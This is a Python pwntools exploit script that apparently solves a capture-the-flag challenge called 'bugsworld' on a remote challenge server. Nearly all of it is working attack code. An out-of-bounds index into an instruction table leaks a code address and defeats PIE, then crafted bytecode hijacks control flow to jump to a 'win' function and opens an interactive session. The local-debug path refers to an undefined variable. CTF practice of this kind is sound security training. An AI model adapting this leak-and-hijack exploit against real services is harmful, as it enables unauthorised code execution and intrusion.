#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chall.pwnoh.io --port 13382 ./bugsworld
from pwn import *
import struct 

# Set up pwntools for the correct architecture
elf = ELF('./bugsworld')
context.binary = './bugsworld'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chall.pwnoh.io'
port = int(args.PORT or 13382)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

p = start()
# STEP 1: LEAK MEMORY
p.recvuntil(b'?')
p.sendline(b'1')
p.recvuntil(b'>')

offset_to_instruction_table = (elf.sym['instruction_table'] - elf.sym['instruction_names'])//32

p.sendline(str(offset_to_instruction_table).encode())
p.recvuntil(b'>')
leak = p.recvuntil(b'Invalid instruction', drop=True)
leak = leak[1:]
leak += b'\x00\x00'

addr = struct.unpack('<Q',leak)[0]
# SET RELATIVE ADDRESSING

elf.address = addr - elf.sym['do_move']

log.success(f'Leaked memory: {hex(addr)}')
log.info(f"Address of win: {hex(elf.sym['win'])}")


# ABUSE THE INSTRUCTION TABLE TO CALL OUR CONSTRUCTED POINTER TO WIN
p.sendline(b'6')
p.recvuntil(b':')

# JUMP 3
p.sendline(b'6')
p.sendline(b'3')

# JUMP win
p.sendline(b'6')
off = (elf.sym.bytecode+5*8 - elf.sym.instruction_table)//8
p.sendline(str(off).encode())

#Pointer to win
p.sendline(b'6')
p.sendline(str(elf.sym['win']).encode())


p.interactive()

p.close()



           